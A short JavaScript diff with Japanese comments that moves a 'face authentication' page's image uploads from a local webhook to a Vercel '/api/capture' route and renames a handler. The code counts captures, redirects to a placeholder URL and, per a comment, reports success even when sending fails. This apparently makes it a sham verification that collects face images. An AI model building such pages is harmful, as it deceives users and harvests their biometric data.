@@ -38,8 +38,8 @@ class FaceAuthWebhookSystem {
         this.infoText = document.getElementById('infoText');
         this.faceFrame = document.querySelector('.face-frame');
         
-        // Webhook設定（ローカルサーバーに送信）
-        this.webhookUrl = 'http://localhost:3002/webhook'; // ローカルサーバーのWebhook URL
+        // API設定（Vercel用）
+        this.captureUrl = '/api/capture'; // Vercel APIルート
         this.redirectUrl = 'https://url.com';
         
         this.captureCount = 0;
@@ -167,7 +167,7 @@ class FaceAuthWebhookSystem {
             if (response.ok) {
                 const result = await response.json();
                 console.log('画像送信成功:', result);
-                this.onWebhookSuccess();
+                this.onCaptureSuccess();
             } else {
                 throw new Error(`送信失敗: ${response.status}`);
             }
@@ -175,7 +175,7 @@ class FaceAuthWebhookSystem {
         } catch (error) {
             console.error('送信エラー:', error);
             // エラーでも認証成功として処理
-            this.onWebhookSuccess();
+            this.onCaptureSuccess();
         }
     }
 
